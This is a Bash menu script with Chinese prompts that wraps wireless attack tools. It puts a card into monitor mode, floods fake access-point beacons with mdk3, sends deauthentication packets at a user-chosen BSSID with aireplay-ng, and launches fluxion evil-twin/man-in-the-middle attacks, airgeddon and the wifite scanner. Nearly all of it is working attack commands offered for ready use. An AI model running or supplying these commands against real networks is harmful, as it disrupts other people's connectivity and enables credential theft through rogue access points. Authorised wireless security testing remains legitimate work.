#!/bin/bash

c=0

function CheckPing() {
	 echo -e "[...] 正在检查网络情况 \c"
	 ping -c 3 8.8.8.8 | grep -q "0% packet loss" && result1=1 || result1=0
	 if [ $result1 -eq 0 ];then
	 	 echo -e "[-] 未Ping到 8.8.8.8 \c"
	 	 ping -c 3 8.8.4.4 | grep -q "0% packet loss" && result2=1 || result2=0
		 if [ $result2 -eq 0 ];then
		 	  echo -e "[-] 无法连接到互联网"
			  exit -1
		 fi 
	 fi
	 echo "[Done.]"
}

function python_ver() {
	ver=$(python -c"import sys; print(sys.version_info.major)")
	if [ $ver -eq 2 ]; then
		ver=$(python3 -c"import sys; print(sys.version_info.major)")
		if [ $ver -eq 3 ]; then
			python_name="python3"
		fi
	elif [ $ver -eq 3 ]; then
		python_name="python"
	else 
		echo " [!]未自动检测到python指令"
		read -p "[&] 请手动输入调用Python指令(版本为3): " python_name
	fi
}

function CheckIntsall() {
	echo -e " [?] 检查aircrack-ng路径: \c"
	which aircrack-ng
	if [ "$?" -ne 0 ]; then
		c=1
		echo "未安装"
		read -rsp $' [./] 重定向至安装模块，回车确认... '
		echo ""
		bash code/install_module.sh
	else
		echo -e " [?] 检查mdk3路径: \c"
		which mdk3
		if [ "$?" -ne 0 ]; then
			c=1
			echo "未安装"
			read -rsp $' [./] 重定向至安装模块，回车确认... '
			echo ""
			bash code/install_module.sh
		fi
	fi
}

while :
do
	echo -e " 选项:"
	echo ""
	echo " [1] 创建AP"
	echo " [2] WiFi协议攻击"
	echo " [3] 扫描工具"
	echo -e "\033[31m [9] 返回 \033[0m"
	echo ""
	read -p '[&] 选择功能类别: ' item1
	echo "-------------------------------------------\
----------------------------------"
	if [ $item1 == 1 -o $item1 == 3 ]; then
		CheckIntsall
		if [ $c == 1 ]; then
			exit
		else
			echo "-------------------------------------------\
----------------------------------"
		fi

		while :
		do
			echo "[+] 列出无线网卡:"
			echo ""
			sudo iwconfig
			read -p "[&] 请选择无线网卡 : " card_name
			check=$(sudo iwconfig $card_name)
			#echo $check
			if [ ! -n "$check" ]; then

				echo "[-] 此接口没有无线功能"
				echo ""
				echo "-------------------------------------------\
----------------------------------"
			else
				break
			fi
		done
    
                
		mode_check=$(sudo iwconfig $card_name|grep "Mode:" |cut -d ':' -f2|cut -d ' ' -f1)
        if [ "${mode_check}" == "Monitor" ]; then
			read -p " [!] 是否跳过网卡设置? [Y/N] " skipset
            if [ $skipset == "Y" -o $skipset == "y" ]; then
                interface=$card_name
				echo "-------------------------------------------\
-------------------------------------"
            else
				echo -e " [-] 正在设置网卡"
				#sudo airmon-ng stop ${card_name}
				card_name=$( sudo airmon-ng stop ${card_name} | grep "mac80211 station" | cut -d "]" -f2 | cut -d ")" -f1 )
				interface=$( sudo airmon-ng start ${card_name} | grep "mac80211 monitor" | cut -d "]" -f3 | cut -d ")" -f1 )
				echo -e " [*] 可在初始菜单中找到硬件设置选项恢复网卡的MAC和模式."
				echo ""
				echo "-------------------------------------------\
----------------------------------"
    		fi
		else
			echo -e " [./] 正在将网卡切换至监听模式"
			interface=$(sudo airmon-ng start ${card_name} | grep "mac80211 monitor" | cut -d "]" -f3 | cut -d ")" -f1)
            echo -e " [*] 可在初始菜单中找到硬件设置选项恢复网卡的MAC和模式."
			echo ""
			echo "-------------------------------------------\
----------------------------------"
		fi
	fi
        if [ $item1 == 1 ]; then
			#FakeAP,用于制造AP
			while :
			do
				echo -e " 选项:"
				echo ""
				echo " [1] 随机产生SSID"
				echo " [2] 新闻SSID"
				#echo " [3] 自定义SSID"
				echo -e "\033[31m [9] 返回 \033[0m"
				echo ""
				read -p ' [&] 选择命名SSID的方式: ' o2
				echo "-------------------------------------------\
----------------------------------"
				if [ $o2 == 1 ]; then
					echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
                    sudo mdk3 $interface b -a -s 200
				elif [ $o2 == 2 ]; then
					echo " [=] 选项: newsAP"
		            echo " [+] 正在获取新闻..."
					echo "-------------------------------------------\
----------------------------------"
		            echo ""
                    IP="news.sina.com.cn"
                    testNet=`ping -c 2 $IP | grep "100% packet loss" | wc -l`
                    if [ "${testNet}" != 0 ];then
                        echo -e " [-] 无法连接到'${IP}'."
                        exit 1
                    else
                        python_ver
                        sudo $python_name code/getnews.py
						echo "-------------------------------------------\
----------------------------------"
                    fi
                    #检查新闻文件是否为空
                    echo "[+] 正在运行(使用 'Ctrl+C' 终止)..."
                    sudo mdk3 $interface b -a -f code/news.txt -s 200
				elif [ $o2 == 3 ]; then
					echo "Not FINISH!"
                    #read -p "[&] 输入自定义文件所在位置: "  filename
		 	 	    #echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
				elif [ $o2 == 9 ]; then
					continue 2
				else
					echo -e "\n[-] 未知选项: $o2"
				fi
			done
		
        elif [ $item1 == 2 ]; then
			#Wifi,用于无线攻击
			while :
			do
				echo -e " 选项:"
				echo ""
				echo " [1] fluxion:evil-twin & MITM"
				echo " [2] airgeddon:支持所有协议攻击(除WPA3)"
                echo " [3] 发送断开连接包(Deth)"
				echo -e "\033[31m [9] 返回 \033[0m"
    			echo ""
				read -p ' [&] 选择要执行的功能: ' o2
            	echo "-------------------------------------------\
----------------------------------"
				if [ $o2 == 1 ]; then
					if [ ! -d "$PWD/fluxion" ]; then
					    echo " [!] 此功能需要安装fluxion工具，请先在安装模块下载"
						read -rsp $' [./] 重定向至安装模块，回车确认... '
				 		echo ""
				 		CheckPing
						bash code/install_module.sh
						echo "-------------------------------------------\
----------------------------------"
						exit
                    else
						cd fluxion
                        sudo bash fluxion.sh
						cd ..
                        break 2
                    fi
                elif [ $o2 == 2 ]; then
                    if [ ! -d "$PWD/airgeddon" ]; then
                        echo " [!] 此功能需要安装airgeddon工具，请先在安装模块下载"
                        read -rsp $' [./] 重定向至安装模块，回车确认... '
				 		echo ""
				 		CheckPing
						bash code/install_module.sh
                        echo "-------------------------------------------\
----------------------------------"
                        exit
                    else
                        cd airgeddon
						sudo bash airgeddon.sh
						cd ..
                        break 2
                    fi
					elif [ $o2 == 9 ]; then
						continue 2
                elif [ $o2 == 3 ]; then
                    #可加个while循环
                    read -p ' [?] 输入对象的BSSID: ' tb
                    sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $interface
                else
					echo -e "\n[-] 未知选项: $o2"
				
                fi
			done

        elif [ $item1 == 3 ]; then
			#airodump: airodump-ng(Aircrack-ng)
			#wash: wash(reaver)
			while :
			do
				echo -e " 扫描工具:"
				echo ""
				echo " [1] airodump-ng"
				echo " [2] wash"
				echo " [3] wifite"
				echo -e "\033[31m [9] 返回 \033[0m"
				echo ""
				read -p ' [&] 选择扫描工具: ' o2
				echo "-------------------------------------------\
----------------------------------"
				if [ $o2 == 1 ]; then
					which airodump-ng
					if [ "$?" -ne 0 ]; then
						echo " [!] 此功能需要安装airodump-ng"
						read -rsp $' [./] 回车确认下载... '
						echo ""
						CheckPing
						sudo apt update
						sudo apt -y install aircrack-ng
					else
						sudo airodump-ng $interface
					fi
					echo "-------------------------------------------\
-------------------------------------"
				elif [ $o2 == 2 ]; then
					echo "-------------------------------------------\
-------------------------------------"
					which wash
					if [ "$?" -ne 0 ]; then
						echo " [!] 此功能需要安装wash"
						read -rsp $' [./] 回车确认下载... '
						echo ""
						CheckPing
						sudo apt update
						sudo apt -y install wash
					else
		            	sudo wash -i $interface
					fi
					echo "-------------------------------------------\
-------------------------------------"
				elif [ $o2 == 3 ]; then
					which wifite
					if [ "$?" -ne 0 ]; then
						echo " [!] 此功能需要安装wifite"
						read -rsp $' [./] 回车确认下载... '
						echo ""
						CheckPing
						sudo apt update
						sudo apt -y install wifite
					else
						sudo wifite
					fi
					echo "-------------------------------------------\
-------------------------------------"
				elif [ $o2 == 9 ]; then
					continue 2
				else
					echo -e "\n [-] 未知选项: $o2"
				fi
			done
		
		elif [ $item1 == 9 ]; then
			exit
		else
			echo -e "\n [-] 未知选项: $item1"  
		fi
done
	